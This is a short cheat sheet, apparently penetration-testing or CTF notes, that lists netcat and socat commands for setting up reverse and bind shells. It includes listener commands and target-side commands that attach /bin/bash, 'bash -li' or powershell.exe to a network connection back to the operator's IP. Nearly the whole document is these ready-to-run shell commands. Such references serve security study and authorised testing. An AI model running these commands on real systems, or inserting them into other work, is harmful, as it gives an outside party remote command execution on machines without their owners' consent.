# NETCAT: Shells 
## Unstable
#### Reverse Shell
Set up a listener on your machine ready to catch an incoming shell. 
```text
nc -lvnp [port_number]
```
- -l is the listener
- -v is to verbose the output
- -n to not resolve host names
- -p specifies the port
#### Bind Shells
Connect to a shell listening on a target machine.
```text
nc [target_ip_address] [port_number]
```
# Target Machine
On the target machine run the following command:
```text
nc [your_ip_address] [port_number] -e /bin/bash
```
Note: refer to the stable shells folder to stablise these shells. 
# SOCAT: Shells
## Unstable
#### Reverse Shell
Set up a basic listener:
```text
socat TCP-L:[port_number] -
```
For Windows machines to connect back use the following:
```text
socat TCP:[ip_address]:[port_number] EXEC:powershell.exe,pipes
```
For Linux machines to connect back use the following:
```text
socat TCP:[ip_address]:[port_number] EXEC:"bash -li"
```
#### Bind Shells
On a Linux machine set up the following listener:
```text
socat TCP-L:[port_number] EXEC:"bash -li"
```
On a Windows machine set up the following listener: 
```text
socat TCP-L:[port_number] EXEC:powershell.exe,pipes
```
Use the following to connect to that bind shell:
```text
socat TCP:[target_ip_address]:[target_port] -
```
